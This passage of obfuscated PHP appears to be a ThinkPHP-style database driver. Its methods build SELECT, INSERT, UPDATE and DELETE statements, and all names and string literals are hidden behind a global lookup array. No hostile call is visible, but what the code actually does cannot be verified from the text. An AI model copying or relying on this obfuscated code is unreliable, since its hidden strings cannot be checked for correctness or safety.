isset($°×ºĞÏö[$ùµóè¦[187]]) ? $°×ºĞÏö[$ùµóè¦[187]] : $ùµóè¦[12], $ùµóè¦[31] => isset($°×ºĞÏö[$ùµóè¦[88]]) ? substr($°×ºĞÏö[$ùµóè¦[88]], 1) : $ùµóè¦[12]); } else { preg_match($ùµóè¦[966], trim($¶ÂíµÎ), $ßù¸èë); $¶ù¼Â³œ = array($ùµóè¦[941] => $ßù¸èë[1], $ùµóè¦[868] => $ßù¸èë[2], $ùµóè¦[869] => $ßù¸èë[3], $ùµóè¦[866] => $ßù¸èë[4], $ùµóè¦[867] => $ßù¸èë[5], $ùµóè¦[31] => $ßù¸èë[6]); } $¶ù¼Â³œ[$ùµóè¦[896]] = $ùµóè¦[12]; return $¶ù¼Â³œ; } protected function debug() { $õ‹ÏùµÓ =& $_SERVER[ë¦»ºéÌ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $õ‹ÏùµÓ[967]; if (think_config($õ‹ÏùµÓ[968])) { think_status($õ‹ÏùµÓ[969]); think_trace($this->queryStr . $õ‹ÏùµÓ[970] . think_status($õ‹ÏùµÓ[34], $õ‹ÏùµÓ[969], 6) . $õ‹ÏùµÓ[971], $õ‹ÏùµÓ[12], $õ‹ÏùµÓ[972]); } } protected function parseLock($¦‡õÎ¦ç = false) { $ÙŒïçé =& $_SERVER[ë¦»ºéÌ]; if (!$¦‡õÎ¦ç) { return $ÙŒïçé[12]; } if ($ÙŒïçé[898] == $this->dbType) { return $ÙŒïçé[973]; } return $ÙŒïçé[974]; } protected function parseSet($º¢”×² ) { $©ñøŞ¼û =& $_SERVER[ë¦»ºéÌ]; foreach ($º¢”×²  as $÷±üË¤ï => $é§­”èì) { if (is_array($é§­”èì) && $©ñøŞ¼û[303] == $é§­”èì[0]) { $Ğ¦¿ùØ¾[] = $this->parseKey($÷±üË¤ï) . $©ñøŞ¼û[864] . $é§­”èì[1]; } elseif (is_scalar($é§­”èì) || is_null($é§­”èì)) { $Ğ¦¿ùØ¾[] = $this->parseKey($÷±üË¤ï) . $©ñøŞ¼û[864] . $this->parseValue($é§­”èì); } } return $©ñøŞ¼û[975] . implode($©ñøŞ¼û[60], $Ğ¦¿ùØ¾); } protected function bindParam($éšÎıÊö, $Ã÷€•¤Õ) { $this->bind[$_SERVER[ë¦»ºéÌ][4] . $éšÎıÊö] = $Ã÷€•¤Õ; } protected function parseBind($‰¸ØğÑÓ) { $‰¸ØğÑÓ = array_merge($this->bind, $‰¸ØğÑÓ); $this->bind = array(); return $‰¸ØğÑÓ; } function parseKey(&$ÑŞËÀñÎ, $å¢ÂèÛ = true) { if ($å¢ÂèÛ) { $ÑŞËÀñÎ = $this->parseKeyCheck($ÑŞËÀñÎ); } return $ÑŞËÀñÎ; } function parseKeyCheck($ïïì°) { $œèé”×¬ =& $_SERVER[ë¦»ºéÌ]; $ïïì° = trim($ïïì°); if (!preg_match($œèé”×¬[976], $ïïì°)) { think_exception($œèé”×¬[977] . $ïïì°); } return $ïïì°; } protected function parseValue($º¤åˆì”) { $ÀÀÜÕÁË =& $_SERVER[ë¦»ºéÌ]; if (is_string($º¤åˆì”)) { $º¤åˆì” = $ÀÀÜÕÁË[937] . $this->escapeString($º¤åˆì”) . $ÀÀÜÕÁË[937]; } elseif (isset($º¤åˆì”[0]) && is_string($º¤åˆì”[0]) && strtolower($º¤åˆì”[0]) == $ÀÀÜÕÁË[303]) { $º¤åˆì” = $this->escapeString($º¤åˆì”[1]); } elseif (is_array($º¤åˆì”)) { $º¤åˆì” = array_map(array($this, $ÀÀÜÕÁË[938]), $º¤åˆì”); } elseif (is_bool($º¤åˆì”)) { $º¤åˆì” = $º¤åˆì” ? $ÀÀÜÕÁË[99] : $ÀÀÜÕÁË[202]; } elseif (is_null($º¤åˆì”)) { $º¤åˆì” = $ÀÀÜÕÁË[114]; } return $º¤åˆì”; } protected function parseField($ƒĞ¼È¬­) { $ØÅ×§š =& $_SERVER[ë¦»ºéÌ]; if (is_string($ƒĞ¼È¬­) && strpos($ƒĞ¼È¬­, $ØÅ×§š[60])) { $ƒĞ¼È¬­ = explode($ØÅ×§š[60], $ƒĞ¼È¬­); } if (is_array($ƒĞ¼È¬­)) { $Ó¨ÇŒã‹ = array(); foreach ($ƒĞ¼È¬­ as $ïâ™ î => $€«Çí‹á) { if (!is_numeric($ïâ™ î)) { $Ó¨ÇŒã‹[] = $this->parseKey($ïâ™ î, !1) . $ØÅ×§š[978] . $this->parseKey($€«Çí‹á); } else { $Ó¨ÇŒã‹[] = $this->parseKey($€«Çí‹á); } } $‚·ó–ŒÃ = implode($ØÅ×§š[60], $Ó¨ÇŒã‹); } elseif (is_string($ƒĞ¼È¬­) && !empty($ƒĞ¼È¬­)) { $‚·ó–ŒÃ = $ƒĞ¼È¬­; } else { $‚·ó–ŒÃ = $ØÅ×§š[193]; } return $‚·ó–ŒÃ; } protected function parseTable($Ç×·¥‡) { $¯Ø©ÛçÉ =& $_SERVER[ë¦»ºéÌ]; if (is_array($Ç×·¥‡)) { $šŸ›áùÜ = array(); foreach ($Ç×·¥‡ as $ó×Î  => $Ûçî¶ÕÈ) { if (!is_numeric($ó×Î )) { $šŸ›áùÜ[] = $this->parseKey($ó×Î ) . $¯Ø©ÛçÉ[63] . $this->parseKey($Ûçî¶ÕÈ); } else { $šŸ›áùÜ[] = $this->parseKey($ó×Î ); } } $Ç×·¥‡ = $šŸ›áùÜ; } elseif (is_string($Ç×·¥‡)) { if (strstr($Ç×·¥‡, $¯Ø©ÛçÉ[63])) { return $Ç×·¥‡; } $Ç×·¥‡ = explode($¯Ø©ÛçÉ[60], $Ç×·¥‡); array_walk($Ç×·¥‡, array($this, $¯Ø©ÛçÉ[886])); } return $¯Ø©ÛçÉ[880] . trim(implode($¯Ø©ÛçÉ[979], $Ç×·¥‡), $¯Ø©ÛçÉ[391]) . $¯Ø©ÛçÉ[880]; } protected function parseWhere($«Í†ûÆ) { $œ–ô™… =& $_SERVER[ë¦»ºéÌ]; $ËÔáƒ»À = $œ–ô™…[12]; if (is_string($«Í†ûÆ)) { $ËÔáƒ»À = $«Í†ûÆ; } else { $¼Ì¿ù¬ = isset($«Í†ûÆ[$œ–ô™…[980]]) ? strtoupper($«Í†ûÆ[$œ–ô™…[980]]) : $œ–ô™…[12]; if (in_array($¼Ì¿ù¬, array($œ–ô™…[981], $œ–ô™…[982], $œ–ô™…[983]))) { $¼Ì¿ù¬ = $œ–ô™…[63] . $¼Ì¿ù¬ . $œ–ô™…[63]; unset($«Í†ûÆ[$œ–ô™…[980]]); } else { $¼Ì¿ù¬ = $œ–ô™…[984]; } foreach ($«Í†ûÆ as $Ãœ²ãÙ => $İÌ±£ö˜) { $ËÔáƒ»À .= $œ–ô™…[283]; if (is_numeric($Ãœ²ãÙ)) { $Ãœ²ãÙ = $œ–ô™…[985]; } if (0 === strpos($Ãœ²ãÙ, $œ–ô™…[11])) { $ËÔáƒ»À .= $this->parseThinkWhere($Ãœ²ãÙ, $İÌ±£ö˜); } else { if (!preg_match($œ–ô™…[986], trim($Ãœ²ãÙ))) { think_exception(think_lang($œ–ô™…[987]) . $œ–ô™…[4] . $Ãœ²ãÙ); } $†ª”ÕôÎ = is_array($İÌ±£ö˜) && isset($İÌ±£ö˜[$œ–ô™…[988]]); $Ãœ²ãÙ = trim($Ãœ²ãÙ); if (strpos($Ãœ²ãÙ, $œ–ô™…[289])) { $ıºôô = explode($œ–ô™…[289], $Ãœ²ãÙ); $‘ã«‰ó = array(); foreach ($ıºôô as $ôªÑöàª => $ÙÕ¶ı¹‡) { $¤ï±º© = $†ª”ÕôÎ ? $İÌ±£ö˜[$ôªÑöàª] : $İÌ±£ö˜; $‘ã«‰ó[] = $œ–ô™…[266] . $this->parseWhereItem($this->parseKey($ÙÕ¶ı¹‡), $¤ï±º©) . $œ–ô™…[885]; } $ËÔáƒ»À .= implode($œ–ô™…[989], $‘ã«‰ó); } elseif (strpos($Ãœ²ãÙ, $œ–ô™…[290])) { $ıºôô = explode($œ–ô™…[290], $Ãœ²ãÙ); $‘ã«‰ó = array(); foreach ($ıºôô as $ôªÑöàª => $ÙÕ¶ı¹‡) { $¤ï±º© = $†ª”ÕôÎ ? $İÌ±£ö˜[$ôªÑöàª] : $İÌ±£ö˜; $‘ã«‰ó[] = $œ–ô™…[266] . $this->parseWhereItem($this->parseKey($ÙÕ¶ı¹‡), $¤ï±º©) . $œ–ô™…[885]; } $ËÔáƒ»À .= implode($œ–ô™…[984], $‘ã«‰ó); } else { $ËÔáƒ»À .= $this->parseWhereItem($this->parseKey($Ãœ²ãÙ), $İÌ±£ö˜); } } $ËÔáƒ»À .= $œ–ô™…[284] . $¼Ì¿ù¬; } $ËÔáƒ»À = substr($ËÔáƒ»À, 0, -strlen($¼Ì¿ù¬)); } return empty($ËÔáƒ»À) ? $œ–ô™…[12] : $œ–ô™…[990] . $ËÔáƒ»À; } protected function parseWhereItem($Îç«ÔÑÃ, $Î€éĞÙ„) { $ãµÛ÷Îí =& $_SERVER[ë¦»ºéÌ]; $òõ´ŸÑ  = $ãµÛ÷Îí[12]; if (is_array($Î€éĞÙ„)) { if (is_string($Î€éĞÙ„[0])) { $û¬ìæçÂ = strtolower($Î€éĞÙ„[0]); if (in_array($Î€éĞÙ„[0], array($ãµÛ÷Îí[864], $ãµÛ÷Îí[991], $ãµÛ÷Îí[992], $ãµÛ÷Îí[993], $ãµÛ÷Îí[994], $ãµÛ÷Îí[995]))) { $òõ´ŸÑ  .= $Îç«ÔÑÃ . $ãµÛ÷Îí[63] . $Î€éĞÙ„[0] . $ãµÛ÷Îí[63] . $this->parseValue($Î€éĞÙ„[1]); } elseif (preg_match($ãµÛ÷Îí[996], $Î€éĞÙ„[0])) { $òõ´ŸÑ  .= $Îç«ÔÑÃ . $ãµÛ÷Îí[63] . $this->exp[$û¬ìæçÂ] . $ãµÛ÷Îí[63] . $this->parseValue($Î€éĞÙ„[1]); } elseif (preg_match($ãµÛ÷Îí[997], $Î€éĞÙ„[0])) { if (is_array($Î€éĞÙ„[1])) { $œ©ƒğÛÑ = isset($Î€éĞÙ„[2]) ? strtoupper($Î€éĞÙ„[2]) : $ãµÛ÷Îí[982]; if (in_array($œ©ƒğÛÑ, array($ãµÛ÷Îí[981], $ãµÛ÷Îí[982], $ãµÛ÷Îí[983]))) { $³„Ãëš = array(); foreach ($Î€éĞÙ„[1] as $‰°èºÀ·) { $³„Ãëš[] = $Îç«ÔÑÃ . $ãµÛ÷Îí[63] . $this->exp[$û¬ìæçÂ] . $ãµÛ÷Îí[63] . $this->parseValue($‰°èºÀ·); } $òõ´ŸÑ  .= $ãµÛ÷Îí[266] . implode($ãµÛ÷Îí[63] . $œ©ƒğÛÑ . $ãµÛ÷Îí[63], $³„Ãëš) . $ãµÛ÷Îí[885]; } } else { $òõ´ŸÑ  .= $Îç«ÔÑÃ . $ãµÛ÷Îí[63] . $this->exp[$û¬ìæçÂ] . $ãµÛ÷Îí[63] . $this->parseValue($Î€éĞÙ„[1]); } } elseif ($ãµÛ÷Îí[303] == $û¬ìæçÂ) { $òõ´ŸÑ  .= $ãµÛ÷Îí[883] . $Îç«ÔÑÃ . $ãµÛ÷Îí[63] . $Î€éĞÙ„[1] . $ãµÛ÷Îí[998]; } elseif (preg_match($ãµÛ÷Îí[999], $Î€éĞÙ„[0])) { $òõ´ŸÑ  .= $Î€éĞÙ„[0]; } elseif (preg_match($ãµÛ÷Îí[1000], $Î€éĞÙ„[0])) { if (isset($Î€éĞÙ„[2]) && $ãµÛ÷Îí[303] == $Î€éĞÙ„[2]) { $òõ´ŸÑ  .= $Îç«ÔÑÃ . $ãµÛ÷Îí[63] . $this->exp[$û¬ìæçÂ] . $ãµÛ÷Îí[63] . $Î€éĞÙ„[1]; } else { if (is_string($Î€éĞÙ„[1])) { $Î€éĞÙ„[1] = explode($ãµÛ÷Îí[60], $Î€éĞÙ„[1]); } $Ç­ÅÕÄº = implode($ãµÛ÷Îí[60], $this->parseValue($Î€éĞÙ„[1])); $òõ´ŸÑ  .= $Îç«ÔÑÃ . $ãµÛ÷Îí[63] . $this->exp[$û¬ìæçÂ] . $ãµÛ÷Îí[883] . $Ç­ÅÕÄº . $ãµÛ÷Îí[885]; } } elseif (preg_match($ãµÛ÷Îí[1001], $Î€éĞÙ„[0])) { $¡õ¶«ôÓ = is_string($Î€éĞÙ„[1]) ? explode($ãµÛ÷Îí[60], $Î€éĞÙ„[1]) : $Î€éĞÙ„[1]; $òõ´ŸÑ  .= $ãµÛ÷Îí[883] . $Îç«ÔÑÃ . $ãµÛ÷Îí[63] . $this->exp[$û¬ìæçÂ] . $ãµÛ÷Îí[63] . $this->parseValue($¡õ¶«ôÓ[0]) . $ãµÛ÷Îí[984] . $this->parseValue($¡õ¶«ôÓ[1]) . $ãµÛ÷Îí[284]; } else { think_exception(think_lang($ãµÛ÷Îí[987]) . $ãµÛ÷Îí[4] . $Î€éĞÙ„[0]); } } else { $™¦úòŸ = count($Î€éĞÙ„); $²Éà·Ó = $ãµÛ÷Îí[12]; if (is_string($Î€éĞÙ„[$™¦úòŸ - 1])) { $²Éà·Ó = isset($Î€éĞÙ„[$™¦úòŸ - 1]) ? strtoupper($Î€éĞÙ„[$™¦úòŸ - 1]) : $ãµÛ÷Îí[12]; if (in_array($²Éà·Ó, array($ãµÛ÷Îí[981], $ãµÛ÷Îí[982], $ãµÛ÷Îí[983]))) { $™¦úòŸ = $™¦úòŸ - 1; } } else { $²Éà·Ó = $ãµÛ÷Îí[981]; } for ($äŒïğŒÌ = 0; $äŒïğŒÌ < $™¦úòŸ; $äŒïğŒÌ++) { $¡õ¶«ôÓ = is_array($Î€éĞÙ„[$äŒïğŒÌ]) ? $Î€éĞÙ„[$äŒïğŒÌ][1] : $Î€éĞÙ„[$äŒïğŒÌ]; if ($ãµÛ÷Îí[303] == strtolower($Î€éĞÙ„[$äŒïğŒÌ][0])) { $òõ´ŸÑ  .= $ãµÛ÷Îí[266] . $Îç«ÔÑÃ . $ãµÛ÷Îí[63] . $¡õ¶«ôÓ . $ãµÛ÷Îí[998] . $²Éà·Ó . $ãµÛ÷Îí[63]; } else { $“±ƒÕÓ = is_array($Î€éĞÙ„[$äŒïğŒÌ]) ? $this->exp[strtolower($Î€éĞÙ„[$äŒïğŒÌ][0])] : $ãµÛ÷Îí[864]; if (!$“±ƒÕÓ && is_array($Î€éĞÙ„[$äŒïğŒÌ]) && in_array($Î€éĞÙ„[$äŒïğŒÌ][0], array($ãµÛ÷Îí[864], $ãµÛ÷Îí[991], $ãµÛ÷Îí[992], $ãµÛ÷Îí[993], $ãµÛ÷Îí[994], $ãµÛ÷Îí[995]))) { $“±ƒÕÓ = $Î€éĞÙ„[$äŒïğŒÌ][0]; } $òõ´ŸÑ  .= $ãµÛ÷Îí[266] . $Îç«ÔÑÃ . $ãµÛ÷Îí[63] . $“±ƒÕÓ . $ãµÛ÷Îí[63] . $this->parseValue($¡õ¶«ôÓ) . $ãµÛ÷Îí[998] . $²Éà·Ó . $ãµÛ÷Îí[63]; } } $òõ´ŸÑ  = substr($òõ´ŸÑ , 0, -4); } } else { $òõ´ŸÑ  .= $Îç«ÔÑÃ . $ãµÛ÷Îí[1002] . $this->parseValue($Î€éĞÙ„); } return $òõ´ŸÑ ; } protected function parseThinkWhere($Éòàé, $ÛÎûî»ê) { $­ÏåÛ‡ =& $_SERVER[ë¦»ºéÌ]; $ë™ö¢Ø¶ = $­ÏåÛ‡[12]; switch ($Éòàé) { case $­ÏåÛ‡[358]: $ë™ö¢Ø¶ = $ÛÎûî»ê; break; case $­ÏåÛ‡[985]: $ë™ö¢Ø¶ = is_string($ÛÎûî»ê) ? $ÛÎûî»ê : substr($this->parseWhere($ÛÎûî»ê), 6); break; case $­ÏåÛ‡[1003]: parse_str($ÛÎûî»ê, $µÍ´æû…); if (isset($µÍ´æû…[$­ÏåÛ‡[980]])) { $¨Şı¢€ò = $­ÏåÛ‡[63] . strtoupper($µÍ´æû…[$­ÏåÛ‡[980]]) . $­ÏåÛ‡[63]; unset($µÍ´æû…[$­ÏåÛ‡[980]]); } else { $¨Şı¢€ò = $­ÏåÛ‡[984]; } $®¼€•µ = array(); foreach ($µÍ´æû… as $Á¢ÈÜ¼ò => $áÄŒ³§×) { $®¼€•µ[] = $this->parseKey($Á¢ÈÜ¼ò) . $­ÏåÛ‡[1002] . $this->parseValue($áÄŒ³§×); } $ë™ö¢Ø¶ = implode($¨Şı¢€ò, $®¼€•µ); break; } return $ë™ö¢Ø¶; } protected function parseLimit($µ×ãÉö) { $Å°‚’âÊ =& $_SERVER[ë¦»ºéÌ]; return !empty($µ×ãÉö) ? $Å°‚’âÊ[61] . $µ×ãÉö . $Å°‚’âÊ[63] : $Å°‚’âÊ[12]; } protected function parseJoin($´ºà• ¼) { $¢†‡Ô²ô =& $_SERVER[ë¦»ºéÌ]; $‰ì ö… = $¢†‡Ô²ô[12]; if (!empty($´ºà• ¼)) { if (is_array($´ºà• ¼)) { foreach ($´ºà• ¼ as $½´›Ãè  => $÷£ÙíÕÂ) { if (!1 !== stripos($÷£ÙíÕÂ, $¢†‡Ô²ô[1004])) { $‰ì ö… .= $¢†‡Ô²ô[63] . $÷£ÙíÕÂ; } else { $‰ì ö… .= $¢†‡Ô²ô[1005] . $÷£ÙíÕÂ; } } } else { $‰ì ö… .= $¢†‡Ô²ô[1005] . $´ºà• ¼; } } $‰ì ö… = preg_replace($¢†‡Ô²ô[1006], think_config($¢†‡Ô²ô[910]) . $¢†‡Ô²ô[1007], $‰ì ö…); return $‰ì ö…; } protected function parseOrder($«í•¿¤ƒ) { $¥µÇ¾Ÿ =& $_SERVER[ë¦»ºéÌ]; if (is_array($«í•¿¤ƒ)) { $í£¿¥çÂ = array(); foreach ($«í•¿¤ƒ as $äÕ–µƒ† => $î­Ğ½¡) { if (is_numeric($äÕ–µƒ†)) { $í£¿¥çÂ[] = $this->parseKey($î­Ğ½¡); } else { $î­Ğ½¡ = in_array(strtoupper(trim($î­Ğ½¡)), array($¥µÇ¾Ÿ[1008], $¥µÇ¾Ÿ[1009])) ? $¥µÇ¾Ÿ[63] . $î­Ğ½¡ : $¥µÇ¾Ÿ[12]; if (preg_match($¥µÇ¾Ÿ[1010], $äÕ–µƒ†)) { $í£¿¥çÂ[] = $this->parseKey($äÕ–µƒ†) . $î­Ğ½¡; } else { think_exception($¥µÇ¾Ÿ[1011] . $äÕ–µƒ†); } } } $«í•¿¤ƒ = implode($¥µÇ¾Ÿ[60], $í£¿¥çÂ); } return !empty($«í•¿¤ƒ) ? $¥µÇ¾Ÿ[1012] . $«í•¿¤ƒ : $¥µÇ¾Ÿ[12]; } protected function parseGroup($âØÒÚôï) { $ñ¢Ş¶ˆ =& $_SERVER[ë¦»ºéÌ]; return !empty($âØÒÚôï) ? $ñ¢Ş¶ˆ[1013] . $âØÒÚôï : $ñ¢Ş¶ˆ[12]; } protected function parseHaving($Êâ¯´¡è) { $Ö³»È“ =& $_SERVER[ë¦»ºéÌ]; return !empty($Êâ¯´¡è) ? $Ö³»È“[1014] . $Êâ¯´¡è : $Ö³»È“[12]; } protected function parseComment($³£ˆÕÚ‘) { $­”ëúÁÈ =& $_SERVER[ë¦»ºéÌ]; return !empty($³£ˆÕÚ‘) ? $­”ëúÁÈ[1015] . $³£ˆÕÚ‘ . $­”ëúÁÈ[1016] : $­”ëúÁÈ[12]; } protected function parseDistinct($¦½ÖÚÅÑ) { $Œ®¶øß“ =& $_SERVER[ë¦»ºéÌ]; return !empty($¦½ÖÚÅÑ) ? $Œ®¶øß“[1017] : $Œ®¶øß“[12]; } protected function parseUnion($´ß¸Êèá) { $…ô¦™Ëš =& $_SERVER[ë¦»ºéÌ]; if (empty($´ß¸Êèá)) { return $…ô¦™Ëš[12]; } if (isset($´ß¸Êèá[$…ô¦™Ëš[354]])) { $°æ±Üô = $…ô¦™Ëš[1018]; unset($´ß¸Êèá[$…ô¦™Ëš[354]]); } else { $°æ±Üô = $…ô¦™Ëš[1019]; } foreach ($´ß¸Êèá as $‘¸™Ş¬) { $¶˜ö¨”Â[] = $°æ±Üô . (is_array($‘¸™Ş¬) ? $this->buildSelectSql($‘¸™Ş¬) : $‘¸™Ş¬); } return implode($…ô¦™Ëš[63], $¶˜ö¨”Â); } public function insert($Œ™ùãó®, $Îœì‰½ = array(), $ü¢¨Í’Ñ = false) { $åÕÈÜò =& $_SERVER[ë¦»ºéÌ]; $÷Ÿ¢Ó‹³ = $â“³ë¼û = array(); $this->model = $Îœì‰½[$åÕÈÜò[287]]; foreach ($Œ™ùãó® as $¹‡†¶ÔØ => $ªÊ«–™æ) { if (is_array($ªÊ«–™æ) && $åÕÈÜò[303] == $ªÊ«–™æ[0]) { $â“³ë¼û[] = $this->parseKey($¹‡†¶ÔØ); $÷Ÿ¢Ó‹³[] = $ªÊ«–™æ[1]; } elseif (is_scalar($ªÊ«–™æ) || is_null($ªÊ«–™æ)) { $â“³ë¼û[] = $this->parseKey($¹‡†¶ÔØ); $÷Ÿ¢Ó‹³[] = $this->parseValue($ªÊ«–™æ); } } $ñ³ÓÍåî = ($ü¢¨Í’Ñ ? $åÕÈÜò[887] : $åÕÈÜò[888]) . $åÕÈÜò[889] . $this->parseTable($Îœì‰½[$åÕÈÜò[285]]) . $åÕÈÜò[883] . implode($åÕÈÜò[60], $â“³ë¼û) . $åÕÈÜò[884] . implode($åÕÈÜò[60], $÷Ÿ¢Ó‹³) . $åÕÈÜò[885]; $ñ³ÓÍåî .= $this->parseLock(isset($Îœì‰½[$åÕÈÜò[827]]) ? $Îœì‰½[$åÕÈÜò[827]] : !1); $ñ³ÓÍåî .= $this->parseComment(!empty($Îœì‰½[$åÕÈÜò[360]]) ? $Îœì‰½[$åÕÈÜò[360]] : $åÕÈÜò[12]); return $this->execute($ñ³ÓÍåî, $this->parseBind(!empty($Îœì‰½[$åÕÈÜò[291]]) ? $Îœì‰½[$åÕÈÜò[291]] : array())); } public function selectInsert($ˆô¼š´Ñ, $İ÷êòóİ, $Œ¯’‚ÄÌ = array()) { $Ğ—ÏÄÂá =& $_SERVER[ë¦»ºéÌ]; $this->model = $Œ¯’‚ÄÌ[$Ğ—ÏÄÂá[287]]; if (is_string($ˆô¼š´Ñ)) { $ˆô¼š´Ñ = explode($Ğ—ÏÄÂá[60], $ˆô¼š´Ñ); } array_walk($ˆô¼š´Ñ, array($this, $Ğ—ÏÄÂá[886])); $ıú¬ñ¾û = $Ğ—ÏÄÂá[1020] . $this->parseTable($İ÷êòóİ) . $Ğ—ÏÄÂá[883] . implode($Ğ—ÏÄÂá[60], $ˆô¼š´Ñ) . $Ğ—ÏÄÂá[998]; $ıú¬ñ¾û .= $this->buildSelectSql($Œ¯’‚ÄÌ); return $this->execute($ıú¬ñ¾û, $this->parseBind(!empty($Œ¯’‚ÄÌ[$Ğ—ÏÄÂá[291]]) ? $Œ¯’‚ÄÌ[$Ğ—ÏÄÂá[291]] : array())); } public function update($ãâÚĞŞÒ, $ˆ÷–öÉ) { $îó×İù÷ =& $_SERVER[ë¦»ºéÌ]; $this->model = $ˆ÷–öÉ[$îó×İù÷[287]]; $©¸…å‚¬ = $îó×İù÷[1021] . $this->parseTable($ˆ÷–öÉ[$îó×İù÷[285]]) . $this->parseSet($ãâÚĞŞÒ) . $this->parseWhere(!empty($ˆ÷–öÉ[$îó×İù÷[281]]) ? $ˆ÷–öÉ[$îó×İù÷[281]] : $îó×İù÷[12]) . $this->parseOrder(!empty($ˆ÷–öÉ[$îó×İù÷[371]]) ? $ˆ÷–öÉ[$îó×İù÷[371]] : $îó×İù÷[12]) . $this->parseLimit(!empty($ˆ÷–öÉ[$îó×İù÷[298]]) ? $ˆ÷–öÉ[$îó×İù÷[298]] : $îó×İù÷[12]) . $this->parseLock(isset($ˆ÷–öÉ[$îó×İù÷[827]]) ? $ˆ÷–öÉ[$îó×İù÷[827]] : !1) . $this->parseComment(!empty($ˆ÷–öÉ[$îó×İù÷[360]]) ? $ˆ÷–öÉ[$îó×İù÷[360]] : $îó×İù÷[12]); return $this->execute($©¸…å‚¬, $this->parseBind(!empty($ˆ÷–öÉ[$îó×İù÷[291]]) ? $ˆ÷–öÉ[$îó×İù÷[291]] : array())); } public function delete($ØÑ¿×ê» = array()) { $Ÿ¹é›¼² =& $_SERVER[ë¦»ºéÌ]; $this->model = $ØÑ¿×ê»[$Ÿ¹é›¼²[287]]; $øŞ²¾é = $Ÿ¹é›¼²[1022] . $this->parseTable($ØÑ¿×ê»[$Ÿ¹é›¼²[285]]) . $this->parseWhere(!empty($ØÑ¿×ê»[$Ÿ¹é›¼²[281]]) ? $ØÑ¿×ê»[$Ÿ¹é›¼²[281]] : $Ÿ¹é›¼²[12]) . $this->parseOrder(!empty($ØÑ¿×ê»[$Ÿ¹é›¼²[371]]) ? $ØÑ¿×ê»[$Ÿ¹é›¼²[371]] : $Ÿ¹é›¼²[12]) . $this->parseLimit(!empty($ØÑ¿×ê»[$Ÿ¹é›¼²[298]]) ? $ØÑ¿×ê»[$Ÿ¹é›¼²[298]] : $Ÿ¹é›¼²[12]) . $this->parseLock(isset($ØÑ¿×ê»[$Ÿ¹é›¼²[827]]) ? $ØÑ¿×ê»[$Ÿ¹é›¼²[827]] : !1) . $this->parseComment(!empty($ØÑ¿×ê»[$Ÿ¹é›¼²[360]]) ? $ØÑ¿×ê»[$Ÿ¹é›¼²[360]] : $Ÿ¹é›¼²[12]); return $this->execute($øŞ²¾é, $this->parseBind(!empty($ØÑ¿×ê»[$Ÿ¹é›¼²[291]]) ? $ØÑ¿×ê»[$Ÿ¹é›¼²[291]] : array())); } public function select($®Šéş›€ = array()) { $ÖŠ ô¦‡ =& $_SERVER[ë¦»ºéÌ]; $this->model = $®Šéş›€[$ÖŠ ô¦‡[287]]; $×¬Ñ’ôÉ = $this->buildSelectSql($®Šéş›€); $ş›ô±õ = isset($®Šéş›€[$ÖŠ ô¦‡[355]]) ? $®Šéş›€[$ÖŠ ô¦‡[355]] : !1; if ($ş›ô±õ) { $×Æì¼Şˆ = is_string($ş›ô±õ[$ÖŠ ô¦‡[105]]) ? $ş›ô±õ[$ÖŠ ô¦‡[105]] : $ÖŠ ô¦‡[1023] . md5($×¬Ñ’ôÉ); $ˆ¢óÁ”¯ = think_cache($×Æì¼Şˆ, $ÖŠ ô¦‡[12], $ş›ô±õ); if (!1 !== $ˆ¢óÁ”¯) { return $ˆ¢óÁ”¯; } } $ú™©÷‰Ğ = $this->query($×¬Ñ’ôÉ, $this->parseBind(!empty($®Šéş›€[$ÖŠ ô¦‡[291]]) ? $®Šéş›€[$ÖŠ ô¦‡[291]] : array())); if ($ş›ô±õ && !1 !== $ú™©÷‰Ğ) { think_cache($×Æì¼Şˆ, $ú™©÷‰Ğ, $ş›ô±õ); } return $ú™©÷‰Ğ; } public function buildSelectSql($³ŠçíÍ = array()) { $å±¶¤ò• =& $_SERVER[ë¦»ºéÌ]; if (isset($³ŠçíÍ[$å±¶¤ò•[359]])) { if (strpos($³ŠçíÍ[$å±¶¤ò•[359]], $å±¶¤ò•[60])) { list($ïÓ¯°¨, $ÕœŠ¡Ê) = explode($å±¶¤ò•[60], $³ŠçíÍ[$å±¶¤ò•[359]]); } else { $ïÓ¯°¨ = $³ŠçíÍ[$å±¶¤ò•[359]]; } $ïÓ¯°¨ = $ïÓ¯°¨ ? $ïÓ¯°¨ : 1; $ÕœŠ¡Ê = isset($ÕœŠ¡Ê) ? $ÕœŠ¡Ê : (is_numeric($³ŠçíÍ[$å±¶¤ò•[298]]) ? $³ŠçíÍ[$å±¶¤ò•[298]] : 20); $ÜººÈû‡ = $ÕœŠ¡Ê * ((int) $ïÓ¯°¨ - 1); $³ŠçíÍ[$å±¶¤ò•[298]] = $ÜººÈû‡ . $å±¶¤ò•[60] . $ÕœŠ¡Ê; } if (think_config($å±¶¤ò•[1024])) { $Æ¡Áó• = $å±¶¤ò•[1025] . md5(serialize($³ŠçíÍ)); $åÚÒŠß‘ = think_cache($Æ¡Áó•); if ($åÚÒŠß‘) { return $åÚÒŠß‘; } } $¾Ï´šÅ• = $this->parseSql($this->selectSql, $³ŠçíÍ); $¾Ï´šÅ• .= $this->parseLock(isset($³ŠçíÍ[$å±¶¤ò•[827]]) ? $³ŠçíÍ[$å±¶¤ò•[827]] : !1); if (isset($Æ¡Áó•)) { think_cache($Æ¡Áó•, $¾Ï´šÅ•); } return $¾Ï´šÅ•; } public function parseSql($œã‚‰ù, $ªå„ŒúŒ = array()) { $õÛûÕ·ú =& $_SERVER[ë¦»ºéÌ]; $œã‚‰ù = str_replace(array($õÛûÕ·ú[1026], $õÛûÕ·ú[1027], $õÛûÕ·ú[1028], $õÛûÕ·ú[1029], $õÛûÕ·ú[1030], $õÛûÕ·ú[1031], $õÛûÕ·ú[1032], $õÛûÕ·ú[1033], $õÛûÕ·ú[1034], $õÛûÕ·ú[1035], $õÛûÕ·ú[1036]), array($this->parseTable("{$ªå„ŒúŒ[$õÛûÕ·ú[285]]}"), $this->parseDistinct(isset($ªå„ŒúŒ[$õÛûÕ·ú[1037]]) ? $ªå„ŒúŒ[$õÛûÕ·ú[1037]] : !1), $this->parseField(!empty($ªå„ŒúŒ[$õÛûÕ·ú[279]]) ? $ªå„ŒúŒ[$õÛûÕ·ú[279]] : $õÛûÕ·ú[193]), $this->parseJoin(!empty($ªå„ŒúŒ[$õÛûÕ·ú[288]]) ? $ªå„ŒúŒ[$õÛûÕ·ú[288]] : $õÛûÕ·ú[12]), $this->parseWhere(!empty($ªå„ŒúŒ[$õÛûÕ·ú[281]]) ? $ªå„ŒúŒ[$õÛûÕ·ú[281]] : $õÛûÕ·ú[12]), 